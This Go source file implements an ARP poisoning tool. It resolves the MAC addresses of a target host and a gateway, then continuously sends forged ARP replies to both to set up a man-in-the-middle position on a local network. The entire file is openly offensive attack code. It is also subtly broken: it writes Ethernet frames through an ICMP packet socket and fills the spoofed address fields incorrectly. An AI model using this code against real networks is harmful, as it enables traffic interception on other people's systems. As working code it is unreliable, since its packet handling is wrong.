package ARPpoisoning

import (
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

var (
	targetIP   net.IP            // IP address of the target
	gatewayIP  net.IP            // IP address of the gateway
	targetMAC  net.HardwareAddr  // MAC address of the target
	gatewayMAC net.HardwareAddr  // MAC address of the gateway
	ifaceName  string            // Network interface name
	stopChan   chan struct{}     // Channel to signal stop for ARP poisoning
)

// SetARPParams sets the IP addresses and network interface for ARP poisoning
func SetARPParams(targetIPStr, gatewayIPStr, interfaceName string) {
	targetIP = net.ParseIP(targetIPStr)
	gatewayIP = net.ParseIP(gatewayIPStr)
	ifaceName = interfaceName
}

// StartARPPoisoning starts ARP poisoning
func StartARPPoisoning() error {
	var err error

	// Get the MAC addresses of the target and the gateway
	targetMAC, err = getMACAddress(targetIP)
	if err != nil {
		return fmt.Errorf("failed to get target MAC address: %v", err)
	}
	gatewayMAC, err = getMACAddress(gatewayIP)
	if err != nil {
		return fmt.Errorf("failed to get gateway MAC address: %v", err)
	}

	// Start ARP poisoning
	stopChan = make(chan struct{})
	go sendARPPackets(targetIP, gatewayMAC, stopChan)
	go sendARPPackets(gatewayIP, targetMAC, stopChan)

	// Log ARP poisoning start
	log.Printf("ARP poisoning started. Target: %s (%s), Gateway: %s (%s)",
		targetIP.String(), targetMAC.String(), gatewayIP.String(), gatewayMAC.String())

	return nil
}

// StopARPPoisoning stops ARP poisoning
func StopARPPoisoning() {
	if stopChan != nil {
		close(stopChan)
		log.Println("ARP poisoning stopped")
	}
}

// sendARPPackets continuously sends ARP packets to perform ARP poisoning
func sendARPPackets(destIP net.IP, destMAC net.HardwareAddr, stopChan chan struct{}) {
	// Get the network interface
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Printf("Failed to get interface: %v", err)
		return
	}

	// Create a raw socket to send ARP packets
	conn, err := net.ListenPacket("ip4:icmp", iface.Name)
	if err != nil {
		log.Printf("Failed to create raw socket: %v", err)
		return
	}
	defer conn.Close()

	// Craft the ARP reply packet
	ethernetLayer := &layers.Ethernet{
		SrcMAC:       iface.HardwareAddr,
		DstMAC:       destMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(iface.HardwareAddr),
		SourceProtAddress: []byte(destIP),
		DstHwAddress:      []byte(destMAC),
		DstProtAddress:    []byte(destIP),
	}
	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	err = gopacket.SerializeLayers(buffer, opts, ethernetLayer, arpLayer)
	if err != nil {
		log.Printf("Failed to serialize ARP packet: %v", err)
		return
	}

	// Send the ARP reply packet continuously until stopped
	for {
		select {
		case <-stopChan:
			return // Stop sending ARP packets
		default:
			_, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: destIP})
			if err != nil {
				log.Printf("Failed to send ARP packet: %v", err)
			}
			time.Sleep(1 * time.Second) // Send ARP packet every second
		}
	}
}

// getMACAddress retrieves the MAC address associated with the given IP address using ARP
func getMACAddress(ip net.IP) (net.HardwareAddr, error) {
	// Create an ARP request packet
	conn, err := net.ListenPacket("ip4:icmp", "")
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	// Craft the ARP request packet
	ethernetLayer := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0, 1, 2, 3, 4, 5},                // Source MAC address (arbitrary)
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, // Broadcast MAC address
		EthernetType: layers.EthernetTypeARP,
	}
	arpLayer := &layers.ARP{
			AddrType:          layers.LinkTypeEthernet,
			Protocol:          layers.EthernetTypeIPv4,
			HwAddressSize:     6,
			ProtAddressSize:   4,
			Operation:         layers.ARPRequest,
			SourceHwAddress:   []byte{0, 1, 2, 3, 4, 5}, // Source MAC address (arbitrary)
			SourceProtAddress: []byte(net.IP{0, 0, 0, 0}), // Source IP address (arbitrary)
			DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},   // Zero MAC address (unknown)
			DstProtAddress:    []byte(ip),
	}
	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	err = gopacket.SerializeLayers(buffer, opts, ethernetLayer, arpLayer)
	if err != nil {
		return nil, err
	}

	// Send the ARP request packet and wait for the ARP reply
	_, err = conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: ip})
	if err != nil {
		return nil, err
	}

	// Read the ARP reply packet
	var replyBuffer = make([]byte, 2048)
	n, _, err := conn.ReadFrom(replyBuffer)
	if err != nil {
		return nil, err
	}

	// Parse the ARP reply packet
	packet := gopacket.NewPacket(replyBuffer[:n], layers.LayerTypeEthernet, gopacket.Default)
	arpReplyLayer := packet.Layer(layers.LayerTypeARP)
	if arpReplyLayer == nil {
		return nil, fmt.Errorf("no ARP reply received")
	}
	arpReply, _ := arpReplyLayer.(*layers.ARP)
	if arpReply.Operation != layers.ARPReply {
		return nil, fmt.Errorf("not an ARP reply")
	}
	return net.HardwareAddr(arpReply.SourceHwAddress), nil
}
